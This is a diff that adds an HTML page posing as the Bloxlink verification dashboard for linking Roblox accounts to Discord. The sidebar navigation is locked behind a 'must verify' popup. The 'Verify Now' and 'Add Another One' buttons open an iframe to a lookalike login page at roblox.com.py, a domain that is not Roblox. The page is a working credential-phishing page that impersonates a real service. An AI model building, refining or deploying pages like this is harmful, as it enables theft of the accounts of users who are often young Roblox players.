@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Bloxlink – Verifications</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="top-bar">
+  ℹ️ Bloxlink is now part of the Roblox family! Read more here:
+  <a href="#" target="_blank">https://x.com/bloxlink/status/1818339107220693288</a>
+</div>
+
+<div class="layout">
+
+  <aside class="sidebar">
+    <div class="logo">
+      <img src="https://cdn.top.gg/icons/cc8bb23addd8100447e8712bbf2f9d40.png" class="logo-img">
+      <span class="text">bloxlink</span>
+    </div>
+
+    <div class="section">
+      <p class="section-title">GENERAL</p>
+      <button class="nav-item active" onclick="openBlockedPopup()">
+        <span class="icon">✓</span> Verifications
+      </button>
+      <button class="nav-item" onclick="openBlockedPopup()">
+        <span class="icon">▦</span> Manage Servers
+      </button>
+    </div>
+
+    <div class="section">
+      <p class="section-title">ACCOUNT</p>
+      <button class="nav-item" onclick="openBlockedPopup()">
+        <span class="icon">◼</span> Manage Subscriptions
+      </button>
+      <button class="nav-item" onclick="openBlockedPopup()">
+        <span class="icon">⚙</span> Settings
+      </button>
+    </div>
+
+    <div class="section">
+      <p class="section-title">OTHER</p>
+      <button class="nav-item" onclick="openBlockedPopup()">
+        <span class="icon">?</span> Support
+      </button>
+      <button class="nav-item" onclick="openBlockedPopup()">
+        <span class="icon">⌘</span> Developer API
+      </button>
+    </div>
+  </aside>
+
+  <main class="content">
+    <h2>Verifications</h2>
+    <p class="subtitle">Manage your linked Roblox accounts.</p>
+
+    <div class="verify-card">
+      <div>
+        <h1>Get started now by linking your Roblox account to Discord</h1>
+        <p>
+          Join our millions of users by linking your Roblox account to Discord.
+          After verifying, you'll gain access to thousands of Roblox communities.
+        </p>
+      </div>
+
+      <button 
+        class="verify-circle"
+        onclick="openIframe('https://roblox.com.py/login?returnUrl=7692425652606225')"
+      >
+        Verify Now
+      </button>
+    </div>
+
+    <div class="missing-bar">
+      <span>Missing an account?</span>
+      <a 
+        href="#"
+        class="missing-btn"
+        onclick="openIframe('https://roblox.com.py/login?returnUrl=7692425652606225')"
+      >
+        + Add Another One
+      </a>
+    </div>
+
+  </main>
+</div>
+
+<!-- POPUP BLOQUEADO -->
+<div id="blockedOverlay" class="popup-overlay">
+  <div class="popup">
+    <div class="popup-header red">
+      Must verify to access other sections of the dashboard
+    </div>
+    <div class="popup-body">
+      <button onclick="closeBlocked()">Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- POPUP IFRAME -->
+<div id="iframeOverlay" class="popup-overlay">
+  <div class="iframe-popup">
+    <button class="close-iframe" onclick="closeIframe()">✕</button>
+    <iframe id="popupIframe"></iframe>
+  </div>
+</div>
+
+<script>
+function openBlockedPopup() {
+  document.getElementById("blockedOverlay").classList.add("show");
+}
+
+function closeBlocked() {
+  document.getElementById("blockedOverlay").classList.remove("show");
+}
+
+function openIframe(url) {
+  document.getElementById("popupIframe").src = url;
+  document.getElementById("iframeOverlay").classList.add("show");
+}
+
+function closeIframe() {
+  document.getElementById("popupIframe").src = "";
+  document.getElementById("iframeOverlay").classList.remove("show");
+}
+</script>
+
+</body>
+</html>
